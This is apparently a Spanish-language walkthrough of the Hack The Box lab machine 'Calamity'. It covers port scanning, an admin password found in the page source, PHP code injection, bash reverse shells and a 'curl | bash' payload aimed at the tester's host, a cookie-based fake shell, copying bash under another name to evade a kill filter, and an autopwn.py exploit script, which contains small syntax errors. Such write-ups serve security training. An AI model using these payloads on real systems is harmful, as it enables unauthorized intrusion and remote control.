
``` bash
sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn $HTB -oG allPorts
``` 

``` bash
sudo nmap -p22,80 -sCV $HTB -oN targeted
``` 

``` bash
whatweb http://$HTB
firefox http://$HTB
searchsploit brotherhood
locate .nse
``` 

``` bash
sudo nmap -p80 --script http-enum $HTB -oN webScan
``` 

``` bash
/admin.php
/uploads
``` 

``` bash
/upload.php
/uploads.php
``` 

``` bash
firefox http://$HTB/admin.php
``` 

Revisando la estructura de la pagina web podemos encontrar una contraseña.

![Calamity Web 1]{ width="600" }
[Calamity Web 1]: ../assets/screenshots/Calamity/calamity-web-1.png

``` bash
Username: skoupidotenekes 
Password: admin
``` 

Ingresando las credenciales nos muestra la siguiente pagina web.

![Calamity Web 2]{ width="600" }
[Calamity Web 2]: ../assets/screenshots/Calamity/calamity-web-2.png

Probamos ingresando código `php`.

``` php
<?php system("whoami"); ?>
``` 

Podemos ver que es posible ejecutar comandos `php`.

``` bash title="index.html"
#!/bin/bash

bash -c "bash -i >& /dev/tcp/$IP/443 0>&1"
``` 

``` bash title="on my machine"
python3 -m http.server 80
nc -nlvp 443
``` 

``` php title="on web"
<?php system("curl $IP | bash"); ?>
``` 

Ingresamos a la máquina pero luego nos expulsa.

Probaremos creando una fakeshell, para ello utilizaremos la cookie de sesión.

![Calamity Web 3]{ width="600" }
[Calamity Web 3]: ../assets/screenshots/Calamity/calamity-web-3.png

``` bash title="fakeshell.sh"
#!/bin/bash

function ctrl_c() {
    echo -e "\n\n[!] Saliendo...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT 

#Variables globales

main_url="http://$HTB"

while true; do
    echo -n "[~] " && read -r command # (1)
    curl -s -X GET  $main_url --data-urlencode "html=<?php system(\"whoami\"); ?>" --cookie "adminpowa=noonecares" --proxy http://127.0.0.1:8080 # (2)
done
```

1. Se le añade `-r` para evitar problemas con los espaciados
2. Se le añade `--proxy` para tunelizar a burpsuite

Colocamos en escucha a Burpsuite y ejecutamos el script `fakeshell.sh`

![Calamity Burp 1]{ width="600" }
[Calamity Burp 1]: ../assets/screenshots/Calamity/calamity-burp-1.png

Notamos que el comando que lanzamos en la URL se está enviando como contenido. Para cambiar esto debemos cambiar `-X GET` por `-G` en el comando de `curl`.

``` bash title="fakeshell.sh"
...
curl -s -G  $main_url --data-urlencode "html=<?php system(\"whoami\"); ?>" --cookie "adminpowa=noonecares" --proxy http://127.0.0.1:8080
...
```

![Calamity Burp 2]{ width="600" }
[Calamity Burp 2]: ../assets/screenshots/Calamity/calamity-burp-2.png

``` bash title="fakeshell.sh"
...
echo; curl -s -G  $main_url --data-urlencode "html=<?php system(\"$command\"); ?>" --cookie "adminpowa=noonecares" | grep "\/body" -A 500 | grep -v "\/body"; echo
...
```

Para mayor comodidad podemos ejecutar`rlwrap ./fakeshell.sh`.

### ¿Por que me expulsa de la sesión?

El archivo `/home/salvas/intrusions` guarda cada log de inicio de sesión.

Podemos copiar la bash con otro nombre para evitar filtros.

``` bash
cp /bin/bash /dev/shm/xjim
``` 

``` bash
nc -lvnp 443
``` 

``` bash
/dev/shm/xjim -c '/dev/shm/xjim -i >& /dev/tcp/$IP/443 0>&1' #(1)
``` 

1. Probamos este comando de diferentes formas, este en particular fue el que nos dió acceso.

``` py title="autopwn.py"
#!/usr/vin/python3

import requests 
import pdb
import sys
import signal
import threading
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://$HTB/admin.php"
burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def makeRequest():
    headers = {
        'Cookie': 'adminpowa=noonecares'
    }

     # (1)
    r = requests.get(main_url + "?html=<?php%20system(\"cp%20/bin/bash%20/dev/shm/xjim\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php system(\"chmod%20+x%20/dev/shm/xjim\");%20?>", headers=headers)
    r = requests.get(main_url + "?html=<?php system(\"/dev/shm/xjim%20-c%20'/dev/shm/xjim%20-i%20>%26%20/dev/tcp/$IP/443%200>%261'\"); ?>", headers=headers, proxies=burp)

    print(r.text)

if __name__ == '__main__:
    try: 
        threading.Thread(target=makeRequest,args()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(lport, timeout=10).wait_for_connection()

    shell.interactive()
```

1. Utiliza `URL ENCODE` para los espacios (`%20`) y para el & (`%26`)